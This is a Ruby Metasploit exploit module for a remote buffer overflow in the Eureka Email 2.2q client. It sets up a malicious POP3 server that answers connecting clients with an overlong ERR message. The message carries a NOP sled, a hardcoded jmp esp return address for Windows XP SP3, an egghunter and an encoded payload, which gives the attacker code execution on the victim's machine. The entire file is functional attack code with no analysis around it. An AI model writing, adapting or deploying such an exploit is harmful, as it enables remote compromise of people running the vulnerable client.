class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
    include Msf::Exploit::Remote::TcpServer
    include Msf::Exploit::Egghunter
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Eureka Email 2.2q ERR Remote Buffer Overflow Exploit',
            'Description'    => %q{
               This module exploits a buffer overflow in the Eureka Email 2.2q
               client that is triggered through an excessively long ERR message.
               },
            'Author'         =>
               [
                 'Peter Van Eeckhoutte (a.k.a corelanc0d3r)'
               ],
            'DefaultOptions' =>
                {
                 'EXITFUNC' => 'process',
                },
            'Payload'        =>
                {
                 'BadChars' => "\x00\x0a\x0d\x20",
                 'StackAdjustment' => -3500,
                 'DisableNops' => true,
                },
             'Platform'       => 'win',
             'Targets'        =>
                [
                 [ 'Win XP SP3 English', { 'Ret' => 0x7E47BCAF } ], # jmp esp / user32.dll
                 ],
             'Privileged'     => false,
             'DefaultTarget'  => 0))

             register_options(
                 [
                     OptPort.new('SRVPORT', [ true, "The POP3 daemon port to listen on", 110 ]),
                 ], self.class
             )
    end

    def on_client_connect(client)
        return if ((p = regenerate_payload(client)) == nil)
        
        # the offset to eip depends on the local ip address string length...
        offsettoeip=723-datastore['SRVHOST'].length
        # create the egg hunter
        hunter = generate_egghunter
        # egg
        egg = hunter[1]
        buffer =  "-ERR "
        buffer << make_nops(offsettoeip)
        buffer << [target.ret].pack('V')
        buffer << hunter[0]
        buffer << make_nops(1000)
        buffer << egg + egg
        buffer << payload.encoded + "\r\n"

        print_status(" [*] Sending exploit to #{client.peerhost}...")
        print_status(" Offset to EIP : #{offsettoeip}")
        client.put(buffer)
        client.put(buffer)
        client.put(buffer)
        client.put(buffer)
        client.put(buffer)
        client.put(buffer)

        handler
        service.close_client(client)
    end
end